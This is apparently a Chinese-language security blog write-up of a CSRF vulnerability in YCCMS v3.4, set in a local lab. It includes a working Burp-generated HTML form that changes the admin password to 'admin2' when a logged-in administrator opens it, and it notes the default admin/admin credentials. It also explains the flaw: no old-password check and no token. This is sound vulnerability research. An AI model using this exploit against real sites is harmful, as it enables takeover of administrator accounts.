---
title: web漏洞@yccms v3.4 csrf漏洞
date: 2021-04-17 16:31:22
cover: https://i.loli.net/2021/04/17/Tnoa3sSO2prCYb7.png
---

## 漏洞环境

yccms v3.4

## 漏洞复现

搭建好环境登陆后台

[http://192.168.0.21/yccms_v3.4/admin](http://192.168.0.21/yccms_v3.4/admin)

默认密码admin,admin

登陆成功后执行下面的poc就会成功将密码修改为admin2，后台登陆状态会强制下

```php
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->

<body>
    <script>history.pushState('', '', '/')</script>
    <form action="http://192.168.0.21/yccms_v3.4/admin/?a=admin&m=update" method="POST">
        <input type="hidden" name="username" value="admin" />
        <input type="hidden" name="password" value="admin2" />
        <input type="hidden" name="notpassword" value="admin2" />
        <input type="hidden" name="send" value="ä&#191;&#174;æ&#148;&#185;å&#175;&#134;ç&#160;&#129;" />
        <input type="submit" value="Submit request" />
    </form>
</body>

</html>
```

## 漏洞原理

先找到根目录下控制器文件夹C:\phpstudy_pro\WWW\yccms_v3.4\controller

可以知道admin路径对应的是AdminAction控制器

![yccms%20v3%204%20csrf%E6%BC%8F%E6%B4%9E%2007680c110529461f93250d4ede511790/Untitled.png](https://i.loli.net/2021/04/17/soy8E1CfXVMe6hD.png)

接下来看下AdminAction.class.php，可以看到修改密码的函数 

![yccms%20v3%204%20csrf%E6%BC%8F%E6%B4%9E%2007680c110529461f93250d4ede511790/Untitled%201.png](https://i.loli.net/2021/04/17/OSWRVYmHaAhl4T3.png)

我们在后台找到修改密码的地方进行抓包对比

a对应action,m对应method，再通过post请求发送username、password、notpassword、send这几个参数就可以发送修改密码的请求

可以看到这里并没有要求输入旧密码，因此可以生成个csrf，测试有没有csrf漏洞

![yccms%20v3%204%20csrf%E6%BC%8F%E6%B4%9E%2007680c110529461f93250d4ede511790/Untitled%202.png](https://i.loli.net/2021/04/17/aMwkANo3pntsDmi.png)

登陆后台后，点击生成的poc文件，密码会被修改